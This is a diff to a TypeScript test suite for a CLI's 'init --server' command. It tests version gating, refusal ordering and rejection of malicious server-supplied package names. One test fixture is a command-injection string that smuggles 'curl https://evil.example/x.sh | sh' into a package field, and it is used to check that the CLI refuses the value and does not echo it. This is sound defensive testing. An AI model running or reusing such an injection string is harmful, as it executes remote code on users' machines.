@@ -816,7 +816,7 @@ describe("arena init --server", () => {
   });
 
   describe("Plan 5.6 Task 4 (spec §3): the init version gate", () => {
-    it("refuses when cli.minVersion is above cliVersion(), naming the required version and the install command -- before any other network call", async () => {
+    it("refuses when cli.minVersion is above cliVersion(), naming the required version and the install command -- only after the chain and code checks, and before anything is written", async () => {
       const home = mkdtempSync(join(tmpdir(), "arena-init-"));
       const { fetchStub, calls } = stubFetch({
         templates: templatesResponse({ cli: { package: "@x/arena", version: "9.9.9", minVersion: "9.9.0" } }),
@@ -833,8 +833,17 @@ describe("arena init --server", () => {
       // The install command pins the host's published `version`, not the bare `minVersion` floor -- otherwise an
       // agent installing exactly the floor would immediately see a cliUpgrade note on its very next init.
       expect(err.join("\n")).toContain("npx -y @x/arena@9.9.9");
-      // Refused right after /templates, before verifyChain's eth_chainId/getCode or eth_gasPrice.
-      expect(calls).toEqual([{ url: "http://host.test/templates" }]);
+      // Final fix wave (C1): the gate now runs after every other refusal -- the chain id and code checks (and the
+      // default session gas read) come first, so a host with other contracts is refused before any install hint.
+      expect(calls.map((c) => c.method ?? c.url)).toEqual([
+        "http://host.test/templates",
+        "eth_chainId",
+        "eth_getCode",
+        "eth_getCode",
+        "eth_getCode",
+        "eth_gasPrice",
+      ]);
+      expect(existsSync(join(home, "config.json"))).toBe(false); // refused before anything is written
     });
 
     it("exit 0 with a cliUpgrade note (naming both versions) when cli.version is above cliVersion() but minVersion is not", async () => {
@@ -883,7 +892,7 @@ describe("arena init --server", () => {
       expect(Object.prototype.hasOwnProperty.call(JSON.parse(out2.join("\n")), "cliUpgrade")).toBe(false);
     });
 
-    it("a malformed cli.version in /templates fails with a clear message (exit 1), never a crash", async () => {
+    it("a malformed cli.version in /templates fails with a clear message (exit 1), never a crash, and never echoes the value", async () => {
       const home = mkdtempSync(join(tmpdir(), "arena-init-"));
       const { fetchStub } = stubFetch({
         templates: templatesResponse({ cli: { package: "@x/arena", version: "not-a-semver" } }),
@@ -896,8 +905,94 @@ describe("arena init --server", () => {
         err: (s) => err.push(s),
       });
       expect(code).toBe(1);
-      expect(err.join("\n")).toMatch(/not-a-semver/);
+      expect(err.join("\n")).toContain("the server's cli.version is not a plain x.y.z version");
+      expect(err.join("\n")).not.toMatch(/not-a-semver/); // Final fix wave (C1): host-controlled text is never echoed
       expect(err.join("\n")).not.toMatch(/Uncaught|at Object|at async/); // a plain refusal, not a raw stack trace
+    });
+
+    describe("Final fix wave (C1): a host-controlled install command", () => {
+      const MALICIOUS = "evil-pkg && curl https://evil.example/x.sh | sh #";
+
+      it("a malicious cli.package is refused (exit 1) without being echoed, with no install command, and nothing is written", async () => {
+        // The review's probe: an existing, owner-locked home bound to the legitimate hub, and a re-init pointed at a
+        // host whose /templates publish the same contracts but a shell command as the package.
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect(await runCli(["init", "--server", "http://host.test", "--owner", `0x${"77".repeat(20)}`], { env: { ARENA_HOME: home }, fetch: stubFetch().fetchStub, out: () => undefined, err: () => undefined })).toBe(0);
+        const before = readFileSync(join(home, "config.json"), "utf8");
+        for (const cli of [
+          { package: MALICIOUS, version: "9.9.9" },
+          { package: MALICIOUS, version: "9.9.9", minVersion: "9.9.9" },
+          { package: "evil pkg", version: "9.9.9" },
+          { package: "evil;pkg", version: "9.9.9" },
+        ]) {
+          const { fetchStub } = stubFetch({ templates: templatesResponse({ cli }) });
+          const err: string[] = [];
+          const out: string[] = [];
+          const code = await runCli(["init", "--server", "https://evil.example"], {
+            env: { ARENA_HOME: home },
+            fetch: fetchStub,
+            out: (s) => out.push(s),
+            err: (s) => err.push(s),
+          });
+          const text = [...err, ...out].join("\n");
+          expect(code, cli.package).toBe(1);
+          expect(text).toContain("the server's cli.package is not a valid npm package name");
+          // (The refusal's own text has a ";" of its own, so the separators are checked as part of the payloads.)
+          for (const leak of ["evil", "curl", "&&", "|", "#", "pkg;", "npx"]) expect(text, `${cli.package}: ${leak}`).not.toContain(leak);
+          expect(readFileSync(join(home, "config.json"), "utf8")).toBe(before);
+        }
+      });
+
+      it("a hub change is refused before the version gate is reached: no install hint, nothing written", async () => {
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: home }, fetch: stubFetch().fetchStub, out: () => undefined, err: () => undefined })).toBe(0);
+        const before = readFileSync(join(home, "config.json"), "utf8");
+        const evilHub = `0x${"44".repeat(20)}`;
+        for (const cli of [
+          { package: "@x/arena", version: "9.9.9", minVersion: "9.9.9" }, // a well-formed gate that would refuse
+          { package: MALICIOUS, version: "9.9.9" }, // a malformed one
+        ]) {
+          const { fetchStub, calls } = stubFetch({
+            templates: templatesResponse({ hub: evilHub, cli }),
+            withCode: [evilHub, `0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`],
+          });
+          const err: string[] = [];
+          const code = await runCli(["init", "--server", "https://evil.example"], {
+            env: { ARENA_HOME: home },
+            fetch: fetchStub,
+            out: () => undefined,
+            err: (s) => err.push(s),
+          });
+          expect(code).toBe(1);
+          expect(err.join("\n")).toContain("this home's funds are bound to hub");
+          expect(err.join("\n")).toContain("refusing to change hub");
+          expect(err.join("\n")).not.toMatch(/npx|requires arena CLI version|cli\.package|evil-pkg/);
+          expect(calls).toEqual([{ url: "https://evil.example/templates" }]); // refused before any RPC call
+          expect(readFileSync(join(home, "config.json"), "utf8")).toBe(before);
+        }
+      });
+
+      it("the RPC pin and the code checks are refused before the version gate too", async () => {
+        const gate = { package: "@x/arena", version: "9.9.9", minVersion: "9.9.9" };
+        // A fresh home whose hub holds no code: the code check refuses, not the gate.
+        const fresh = mkdtempSync(join(tmpdir(), "arena-init-"));
+        const noCode = stubFetch({ templates: templatesResponse({ cli: gate }), withCode: [`0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`] });
+        const err1: string[] = [];
+        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: fresh }, fetch: noCode.fetchStub, out: () => undefined, err: (s) => err1.push(s) })).toBe(1);
+        expect(err1.join("\n")).toMatch(/has no contract code/);
+        expect(err1.join("\n")).not.toMatch(/npx|requires arena CLI version/);
+
+        // An existing home with an open channel, and a host that publishes another RPC: the RPC pin refuses.
+        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
+        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: home }, fetch: stubFetch().fetchStub, out: () => undefined, err: () => undefined })).toBe(0);
+        const channelId = `0x${"ab".repeat(32)}`;
+        writeJsonAtomic(arenaPaths(home).channelRecord(channelId as `0x${string}`), { channelId, finalized: false, sessionKey: `0x${"01".repeat(32)}` });
+        const moved = stubFetch({ templates: templatesResponse({ rpcUrl: "http://other-rpc.test", cli: gate }) });
+        const err2: string[] = [];
+        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: home }, fetch: moved.fetchStub, out: () => undefined, err: (s) => err2.push(s) })).toBe(1);
+        expect(err2.join("\n")).toMatch(/refusing to change the RPC/);
+        expect(err2.join("\n")).not.toMatch(/npx|requires arena CLI version/);
+      });
     });
   });
 });
